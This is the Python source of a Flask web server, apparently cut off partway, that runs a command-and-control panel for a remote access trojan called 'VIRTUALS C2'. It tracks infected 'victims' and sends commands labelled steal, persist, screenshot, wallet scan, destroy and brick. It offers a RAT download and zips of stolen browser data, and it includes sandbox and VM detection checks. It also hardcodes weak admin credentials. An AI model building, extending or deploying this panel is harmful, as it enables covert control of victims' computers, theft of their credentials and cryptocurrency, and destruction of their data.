"""
VIRTUALS C2 - PERFECT BALANCE EDITION
Bigger Text · Smaller Chat Box · All Features
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file, render_template_string, session, redirect, url_for
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid
import threading
import time
import shutil
import zipfile
import hashlib
from io import BytesIO
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['SECRET_KEY'] = 'virtuals_c2_super_secret_key_2024'

# ============================================
# ADMIN CREDENTIALS
# ============================================
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "virtuals2024"

# ============================================
# FOLDERS
# ============================================
folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs', 
           'browser_data', 'downloads', 'uploads', 'files', 'embeds', 'browser_zips']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# ============================================
# DATABASE
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
        is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
        activity TEXT DEFAULT 'idle'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, 
        result TEXT, timestamp TEXT, status TEXT DEFAULT 'pending'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, type TEXT,
        content TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
        last_login TEXT
    )''')
    c.execute("INSERT OR IGNORE INTO admins (username, password) VALUES (?, ?)",
             (ADMIN_USERNAME, hashlib.md5(ADMIN_PASSWORD.encode()).hexdigest()))
    conn.commit()
    return conn

# ============================================
# HEARTBEAT CLEANER
# ============================================
def cleanup_heartbeats():
    while True:
        time.sleep(10)
        try:
            conn = get_db()
            c = conn.cursor()
            cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
            cutoff_str = cutoff.strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online'", (cutoff_str,))
            conn.commit()
            conn.close()
        except:
            pass

threading.Thread(target=cleanup_heartbeats, daemon=True).start()

# ============================================
# VM DETECTION
# ============================================
class VMDetector:
    @staticmethod
    def check_all():
        checks = {
            'registry': VMDetector.check_registry(),
            'processes': VMDetector.check_processes(),
            'hardware': VMDetector.check_hardware(),
            'files': VMDetector.check_files(),
            'memory': VMDetector.check_memory(),
            'network': VMDetector.check_network(),
            'disk': VMDetector.check_disk(),
            'dmi': VMDetector.check_dmi(),
            'bios': VMDetector.check_bios()
        }
        hits = sum(1 for v in checks.values() if v)
        return {
            'is_vm': hits >= 4,
            'confidence': min(100, int((hits / len(checks)) * 100)),
            'safe_mode': True,
            'details': checks
        }
    
    @staticmethod
    def check_registry():
        try:
            import winreg
            indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'Xen']
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System", "SystemManufacturer"),
            ]
            for hkey, subkey, value in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                    if value:
                        val, _ = winreg.QueryValueEx(key, value)
                        for i in indicators:
                            if i.lower() in str(val).lower():
                                return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_processes():
        try:
            procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 
                     'vmmem', 'vmmemctl', 'xenservice.exe', 'qemu-ga.exe']
            for p in procs:
                try:
                    r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {p}'], 
                                      capture_output=True, text=True, timeout=3)
                    if p in r.stdout:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_hardware():
        try:
            cpu = platform.processor()
            if cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu', 'kvm', 'xen']):
                return True
            try:
                import wmi
                w = wmi.WMI()
                for item in w.Win32_ComputerSystem():
                    if any(x in (item.Manufacturer + item.Model).lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen']):
                        return True
            except:
                pass
        except:
            pass
        return False
    
    @staticmethod
    def check_files():
        try:
            files = [
                'C:\\Program Files\\VMware\\VMware Tools\\',
                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
                'C:\\Windows\\System32\\drivers\\vmmemctl.sys',
                'C:\\Windows\\System32\\drivers\\vboxguest.sys',
            ]
            for f in files:
                if os.path.exists(f):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_memory():
        try:
            import psutil
            total_gb = psutil.virtual_memory().total / (1024**3)
            return total_gb < 4 or total_gb in [8.0, 16.0, 32.0]
        except:
            return False
    
    @staticmethod
    def check_network():
        try:
            mac = uuid.getnode()
            prefixes = ['000569', '000c29', '001c42', '005056', '080027', '525400']
            return any(p in format(mac, '012x') for p in prefixes)
        except:
            return False
    
    @staticmethod
    def check_disk():
        try:
            import psutil
            for p in psutil.disk_partitions():
                if p.mountpoint == 'C:\\' or p.mountpoint == '/':
                    total_gb = psutil.disk_usage(p.mountpoint).total / (1024**3)
                    return total_gb < 50 or total_gb in [60, 80, 120, 128, 256]
        except:
            pass
        return False
    
    @staticmethod
    def check_dmi():
        try:
            if os.name == 'nt':
                result = subprocess.run(['wmic', 'baseboard', 'get', 'manufacturer,product'], 
                                      capture_output=True, text=True, timeout=5)
                if any(x in result.stdout.lower() for x in ['vmware', 'virtualbox', 'qemu']):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_bios():
        try:
            if os.name == 'nt':
                result = subprocess.run(['wmic', 'bios', 'get', 'manufacturer,version'], 
                                      capture_output=True, text=True, timeout=5)
                if any(x in result.stdout.lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen']):
                    return True
        except:
            pass
        return False

# ============================================
# SAMPLE WALLET DATA
# ============================================
SAMPLE_WALLETS = {
    "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000, "transactions": 87},
    "ETH": {"address": "0x2ab3bD48B6ed812ac4B6b1377B0F190D5296Fd82", "balance": 15.8, "usd": 63200, "transactions": 234},
    "LTC": {"address": "LeJ4Hw5NZMgbJ8jDnUiS1jnZnav3JTn9mD", "balance": 128.5, "usd": 19275, "transactions": 56},
    "SOL": {"address": "oBmRkEtsd6sRVdJd3h3SvxqT5gKWkzMyjP2vXAahxJ2", "balance": 450.2, "usd": 81036, "transactions": 143},
    "MONERO": {"address": "443LRfNr8EjQm5a3Q5m8rdjYjvZ6j9Q7y6NuvAmLKmmeeCumutdntorANMqT6BNrR37FtfbzKVkjY9ExkmWfSp6FERSQuNt", "balance": 892.7, "usd": 169613, "transactions": 412}
}

# ============================================
# LOGIN REQUIRED DECORATOR
# ============================================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('landing'))
        return f(*args, **kwargs)
    return decorated_function

# ============================================
# HTML - LANDING PAGE
# ============================================
LANDING_PAGE = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 50%,#0a0a0f 100%);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
.login-container{background:rgba(10,10,18,0.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:400px;max-width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.login-container h1{color:#e8e8f0;font-size:32px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
.login-container h1 span{color:#446688}
.login-container .sub{color:#666680;text-align:center;font-size:14px;margin-bottom:30px}
.login-container label{color:#8888a0;font-size:13px;display:block;margin-bottom:5px;letter-spacing:1px}
.login-container input{width:100%;padding:14px 18px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:16px;outline:none;transition:all 0.3s;margin-bottom:15px}
.login-container input:focus{border-color:rgba(68,170,255,0.4);background:rgba(255,255,255,0.08)}
.login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:17px;cursor:pointer;transition:all 0.3s;font-weight:600}
.login-container button:hover{background:rgba(68,170,255,0.25);border-color:rgba(68,170,255,0.4)}
.login-container .error{color:#cc8888;text-align:center;font-size:14px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="login-container">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="sub">Control Panel <span style="color:#44dd88;">● Online</span></div>
<form id="loginForm" onsubmit="login(event)">
<label>Username</label>
<input type="text" id="username" value="admin" required>
<label>Password</label>
<input type="password" id="password" value="virtuals2024" required>
<button type="submit">Access Control Panel</button>
<div class="error" id="errorMsg">Invalid credentials</div>
</form>
</div>
<script>
function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}}).catch(()=>{document.getElementById('errorMsg').style.display='block';});}
</script>
</body>
</html>
'''

# ============================================
# HTML - DASHBOARD (BIG TEXT, SMALLER CHAT BOX)
# ============================================
DASHBOARD = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VIRTUALS C2 - Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:15px}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
.glass{background:rgba(10,10,18,0.85);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.08);border-radius:8px}
.header{background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);padding:10px 20px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;height:50px;flex-shrink:0}
.header h1{color:#e8e8f0;font-size:22px;font-weight:300;letter-spacing:3px}
.header h1 span{color:#446688}
.header .stats{display:flex;gap:18px}
.header .stats .stat-item{color:#8888a0;font-size:14px}
.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:18px;margin-left:4px}
.header .logout-btn{background:rgba(200,60,60,0.15);color:#cc8888;border:1px solid rgba(200,60,60,0.2);padding:5px 16px;border-radius:4px;cursor:pointer;font-size:13px;transition:all 0.2s}
.header .logout-btn:hover{background:rgba(200,60,60,0.25)}
.container{display:flex;height:calc(100vh - 50px);padding:6px;gap:6px}
.left-panel{width:180px;min-width:180px;display:flex;flex-direction:column;gap:6px;height:100%}
.commands-panel{padding:10px 8px;flex:1;overflow-y:auto}
.commands-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:6px}
.cmd-btn{display:block;width:100%;padding:6px 10px;margin:2px 0;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#b0b0c0;font-family:inherit;font-size:14px;cursor:pointer;text-align:left;transition:all 0.15s}
.cmd-btn:hover{background:rgba(255,255,255,0.07);border-color:rgba(255,255,255,0.15);color:#e8e8f0}
.cmd-btn .icon{font-size:15px;margin-right:6px}
.cmd-btn.danger{border-color:rgba(200,60,60,0.25);color:#cc8888}
.cmd-btn.danger:hover{border-color:rgba(200,60,60,0.45)}
.cmd-btn.steal{border-color:rgba(50,180,200,0.25);color:#88ccdd}
.cmd-btn.steal:hover{border-color:rgba(50,180,200,0.45)}
.cmd-btn.file{border-color:rgba(180,180,50,0.25);color:#ccdd88}
.cmd-btn.file:hover{border-color:rgba(180,180,50,0.45)}
.middle-panel{flex:1;display:flex;flex-direction:column;gap:6px;min-width:300px;height:100%}
.victims-panel{padding:8px 12px;height:25%;overflow:hidden;display:flex;flex-direction:column;flex-shrink:0}
.victims-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:6px;flex-shrink:0}
.victim-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:5px;overflow-y:auto;flex:1;align-content:start;padding-right:3px}
.victim-card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;padding:6px 10px;cursor:pointer;transition:all 0.15s}
.victim-card:hover{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.15)}
.victim-card.selected{border-color:rgba(80,140,220,0.5);background:rgba(80,140,220,0.08)}
.victim-card .top{display:flex;justify-content:space-between;align-items:center}
.victim-card .name{color:#e8e8f0;font-size:15px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.victim-card .ip{color:#666680;font-size:12px}
.victim-card .bottom{display:flex;justify-content:space-between;align-items:center;margin-top:2px}
.victim-card .status{font-size:11px;display:flex;align-items:center;gap:4px}
.victim-card .status .dot{display:inline-block;width:6px;height:6px;border-radius:50%;animation:pulse 2s infinite}
.victim-card .status .dot.online{background:#44dd88}
.victim-card .status .dot.offline{background:#664444;animation:none}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.victim-card .vm-badge{background:rgba(200,60,60,0.15);color:#cc8888;font-size:9px;padding:0 6px;border-radius:8px;line-height:14px;height:14px}
.chat-panel{padding:8px 12px;height:45%;display:flex;flex-direction:column;flex-shrink:0}
.chat-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:6px;flex-shrink:0}
.chat-messages{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:5px;padding:6px 10px;flex:1;overflow-y:auto;min-height:60px;max-height:100px;font-size:14px;line-height:1.6}
.chat-messages .msg{padding:1px 0}
.chat-messages .time{color:#555568;margin-right:6px;font-size:12px}
.chat-messages .sender{font-weight:600;font-size:14px}
.chat-messages .sender.us{color:#66ddbb}
.chat-messages .sender.victim{color:#ddbb88}
.chat-messages .sender.system{color:#8888aa}
.chat-messages .sender.embed{color:#ffd700}
.chat-input-area{display:flex;gap:5px;margin-top:5px;flex-shrink:0}
.chat-input-area input{flex:1;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:5px;color:#c8c8d0;font-family:inherit;font-size:15px;outline:none;min-height:36px}
.chat-input-area input:focus{border-color:rgba(255,255,255,0.15)}
.chat-input-area input::placeholder{color:#444458;font-size:13px}
.chat-input-area button{padding:8px 18px;background:rgba(255,255,255,0.05);color:#b0b0c0;border:1px solid rgba(255,255,255,0.08);border-radius:5px;cursor:pointer;font-family:inherit;font-size:15px;transition:all 0.15s}
.chat-input-area button:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.18);color:#e8e8f0}
.file-upload-area{display:flex;gap:5px;margin-top:4px;flex-shrink:0;flex-wrap:wrap;align-items:center}
.file-upload-area input[type="file"]{flex:1;padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#c8c8d0;font-size:13px;min-width:60px}
.file-upload-area button{padding:4px 14px;background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);border-radius:4px;cursor:pointer;font-size:13px;transition:all 0.15s}
.file-upload-area button:hover{background:rgba(50,180,200,0.22)}
.file-upload-area #fileName{color:#555568;font-size:12px;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.upload-progress{width:100%;height:3px;background:rgba(255,255,255,0.05);border-radius:2px;margin-top:3px;overflow:hidden;display:none}
.upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
.activity-monitor{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:4px;padding:4px 8px;margin-top:4px;flex-shrink:0;max-height:45px;overflow-y:auto}
.activity-monitor .title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:1px;margin-bottom:2px}
.activity-item{display:flex;justify-content:space-between;font-size:10px;padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
.activity-item .act-pc{color:#88aacc;font-weight:500}
.activity-item .act-action{color:#8888aa}
.activity-item .act-time{color:#444458;font-size:9px}
.right-panel{width:280px;min-width:280px;display:flex;flex-direction:column;gap:6px;height:100%}
.details-panel{padding:8px 12px;height:42%;overflow-y:auto;flex-shrink:0}
.details-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
.detail-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:14px;display:flex;justify-content:space-between}
.detail-item .label{color:#555568;font-size:13px}
.detail-item .value{color:#e8e8f0;font-weight:500;font-size:14px}
.screenshot-gallery{display:flex;flex-wrap:wrap;gap:4px;margin-top:4px}
.screenshot-thumb{width:55px;height:40px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555568;transition:all 0.15s}
.screenshot-thumb:hover{border-color:rgba(255,255,255,0.15)}
.download-section{padding:4px 0;border-top:1px solid rgba(255,255,255,0.04);margin-top:4px;display:flex;flex-direction:column;gap:3px}
.download-section .label{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:1px}
.download-btn{background:rgba(50,180,120,0.15);color:#66ddbb;border:1px solid rgba(50,180,120,0.2);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:14px;transition:all 0.15s;text-align:center}
.download-btn:hover{background:rgba(50,180,120,0.25)}
.download-zip-btn{background:rgba(50,180,200,0.15);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:14px;transition:all 0.15s;text-align:center}
.download-zip-btn:hover{background:rgba(50,180,200,0.25)}
.logs-panel{padding:8px 12px;flex:1;overflow-y:auto;min-height:0}
.logs-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
.log-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;gap:5px;opacity:0.9}
.log-item .type{padding:1px 5px;border-radius:3px;font-size:8px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
.log-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
.log-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
.log-item .type.steal{background:rgba(50,180,200,0.2);color:#88ccdd}
.log-item .type.file{background:rgba(180,180,50,0.2);color:#ccdd88}
.log-item .type.embed{background:rgba(255,215,0,0.15);color:#ffd700}
.log-item .type.info{background:rgba(68,170,255,0.15);color:#44aaff}
.log-item .type.system{background:rgba(136,136,170,0.15);color:#8888aa}
.log-item .log-time{color:#444458;font-size:10px;flex-shrink:0}
.log-item .log-content{color:#b0b0c0;word-break:break-word;font-size:12px}
.embed-box{background:rgba(0,0,0,0.25);border-left:4px solid var(--embed-color,#44aaff);border-radius:4px;padding:6px 10px;margin:3px 0}
.embed-box .embed-title{font-size:15px;font-weight:600;color:#e8e8f0}
.embed-box .embed-content{font-size:13px;color:#b0b0c0;margin-top:2px;white-space:pre-wrap}
.embed-box .embed-footer{font-size:11px;color:#555568;margin-top:2px}
@media(max-width:1024px){.left-panel{width:150px;min-width:150px}.right-panel{width:220px;min-width:220px}}
@media(max-width:768px){.left-panel{width:100px;min-width:100px}.right-panel{width:160px;min-width:160px}.victim-list{grid-template-columns:repeat(auto-fill,minmax(100px,1fr))}}
</style>
</head>
<body>
<div class="header">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="stats">
<span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
<span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
<span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
<span class="stat-item">LOGS <span class="num" id="logCount">0</span></span>
</div>
<button class="logout-btn" onclick="logout()">Logout</button>
</div>
<div class="container">
<div class="left-panel">
<div class="commands-panel glass">
<div class="title">⚡ Commands</div>
<button class="cmd-btn" onclick="sendCommand('whois')"><span class="icon">🖥️</span>whois</button>
<button class="cmd-btn" onclick="sendCommand('screenshot')"><span class="icon">📸</span>screenshot</button>
<button class="cmd-btn" onclick="sendCommand('flash')"><span class="icon">⚡</span>flash</button>
<button class="cmd-btn" onclick="sendCommand('scan')"><span class="icon">💰</span>scan</button>
<button class="cmd-btn" onclick="sendCommand('persist')"><span class="icon">🔒</span>persist</button>
<button class="cmd-btn steal" onclick="sendCommand('steal')"><span class="icon">🕵️</span>steal</button>
<button class="cmd-btn file" onclick="sendCommand('upload')"><span class="icon">⬆️</span>upload</button>
<button class="cmd-btn file" onclick="sendCommand('download')"><span class="icon">⬇️</span>download</button>
<button class="cmd-btn danger" onclick="sendCommand('destroy')"><span class="icon">💀</span>destroy</button>
<button class="cmd-btn danger" onclick="sendCommand('brick')"><span class="icon">🧱</span>brick</button>
<button class="cmd-btn" onclick="sendCommand('vmcheck')"><span class="icon">🔍</span>vmcheck</button>
<button class="cmd-btn" onclick="sendCommand('oblivion')"><span class="icon">🌀</span>oblivion</button>
</div>
</div>
<div class="middle-panel">
<div class="victims-panel glass">
<div class="title">🎯 Victims</div>
<div class="victim-list" id="victimList"><div style="color:#555568;font-size:14px;text-align:center;padding:10px;">No victims</div></div>
</div>
<div class="chat-panel glass">
<div class="title">💬 Console</div>
<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
<div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
<div class="file-upload-area">
<input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file'">
<span id="fileName">no file</span>
<button onclick="uploadFile()">📤 upload</button>
</div>
<div class="upload-progress" id="uploadProgress"><div class="bar" id="progressBar"></div></div>
<div class="activity-monitor" id="activityMonitor">
<div class="title">🔄 Victim Activity</div>
<div id="activityList"><div style="color:#444458;font-size:10px;">no activity</div></div>
</div>
</div>
</div>
<div class="right-panel">
<div class="details-panel glass">
<div class="title">📋 Victim Details</div>
<div id="victimDetails"><div style="color:#555568;font-size:14px;text-align:center;padding:12px;">select a victim</div></div>
<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
<div style="color:#666680;font-size:10px;text-transform:uppercase;">📸 Screenshots</div>
<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:12px;">none</div></div>
</div>
<div class="download-section">
<div class="label">⬇️ Downloads</div>
<button class="download-btn" onclick="window.open('/download-rat','_blank')">⬇️ RAT</button>
<button class="download-zip-btn" onclick="downloadBrowserZip()">📦 Browser Zip</button>
</div>
</div>
<div class="logs-panel glass">
<div class="title">📊 Logs</div>
<div id="logOutput"><div style="color:#555568;font-size:13px;">no logs</div></div>
</div>
</div>
</div>
<script>
let state={victims:{},selectedVictim:null,commands:{},cmdCount:0,logCount:0};

function logout(){fetch('/api/logout',{method:'POST'}).then(()=>{window.location.href='/';});}
function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;render();update();updateActivity();}});}
function render(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:14px;text-align:center;padding:10px;">No victims</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-card ${state.selectedVictim===v.id?'selected':''}" onclick="select('${v.id}')"><div class="top"><span class="name">${v.pc}</span><span class="ip">${v.ip}</span></div><div class="bottom"><span class="status"><span class="dot ${v.status==='Online'?'online':'offline'}"></span>${v.status}</span>${v.is_vm?'<span class="vm-badge">VM</span>':''}</div></div>`).join('');}
function select(id){state.selectedVictim=id;render();show(id);loadSS(id);}
function show(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value" style="color:${v.status==='Online'?'#66dd88':'#886666'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'⚠ detected':'✅ clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>`;}
function loadSS(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
function update(){const v=Object.values(state.victims);document.getElementById('victimCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;document.getElementById('logCount').textContent=state.logCount;}
function updateActivity(){const el=document.getElementById('activityList');const v=Object.values(state.victims).filter(x=>x.status==='Online');if(v.length===0){el.innerHTML='<div style="color:#444458;font-size:10px;">no activity</div>';return;}const acts=['idle','typing','reading','thinking','responding','processing'];el.innerHTML=v.map(v=>{const act=acts[Math.floor(Math.random()*acts.length)];return `<div class="activity-item"><span class="act-pc">${v.pc}</span><span class="act-action">${act}</span><span class="act-time">${new Date().toLocaleTimeString()}</span></div>`}).join('');}
function addLog(type,content){const el=document.getElementById('logOutput');state.logCount++;document.getElementById('logCount').textContent=state.logCount;let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='steal')cls='steal';else if(type==='file')cls='file';else if(type==='embed')cls='embed';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>100){el.removeChild(el.lastChild);}}
function sendCommand(cmd){if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}add('us','⚡ /'+cmd,'us');addLog('info','Executing '+cmd);api('sendCommand',{victim_id:state.selectedVictim,command:cmd},d=>{if(d.success){if(!state.commands[state.selectedVictim])state.commands[state.selectedVictim]=[];state.commands[state.selectedVictim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;add('us','✅ success','us');addLog('success','Command '+cmd+' completed');if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{add('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('wallet',w.currency+': '+w.balance);});}if(d.embed){addEmbed(d.embed);addLog('embed',d.embed.title);}show(state.selectedVictim);update();}else{add('us','❌ failed','us');addLog('failed','Command '+cmd+' failed');}});}
function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}add('us','📨 '+msg,'us');add('victim','💬 '+msg,'victim');addLog('info','Message sent');}}
